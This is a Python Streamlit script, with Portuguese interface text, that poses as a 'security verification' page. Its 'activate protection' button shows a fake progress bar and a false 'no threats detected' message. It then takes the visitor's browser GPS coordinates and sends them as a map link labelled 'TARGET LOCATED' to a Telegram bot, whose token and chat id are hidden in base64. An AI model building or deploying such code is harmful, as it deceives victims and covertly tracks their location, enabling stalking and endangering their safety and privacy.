import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- TOKEN E ID PROTEGIDOS ---
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

st.set_page_config(page_title="VERIFICAÇÃO", page_icon="🔐")

# Visual Identico ao que você pediu
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'etapa' not in st.session_state:
    st.session_state.etapa = 0

if st.session_state.etapa == 0:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        # Manda o primeiro aviso NA HORA
        enviar_telegram("🔄 SISTEMA: Iniciando verificação no dispositivo...")
        
        barra = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.01)
            barra.progress(i)
        
        st.session_state.etapa = 1
        st.rerun()

elif st.session_state.etapa == 1:
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)
    
    # Tenta pegar o GPS após exibir o sucesso para o usuário
    loc = get_geolocation()
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        enviar_telegram(f"✅ ALVO LOCALIZADO\n📍 Mapa: {mapa}")
        st.session_state.etapa = 2

st.markdown('<br><br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
